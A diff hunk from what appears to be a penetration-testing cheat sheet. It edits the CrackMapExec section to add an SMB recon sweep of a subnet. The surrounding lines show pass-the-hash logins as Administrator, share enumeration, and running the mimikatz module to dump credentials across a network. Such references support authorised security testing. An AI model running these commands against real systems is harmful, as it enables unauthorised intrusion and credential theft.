@@ -235,7 +235,7 @@ nmap:
 
 CrackMapExec: 
 
-    crackmapexec smb -L 
+    crackmapexec smb 192.168.10.0/24    #SMB recon    
     crackmapexec 172.21.0.0 -u Administrator -H [hash] --local-auth
     crackmapexec 172.21.0.0 -u Administrator -H [hash] --share
     crackmapexec smb 172.21.0.0/24 -u user -p 'Password' --local-auth -M mimikatz
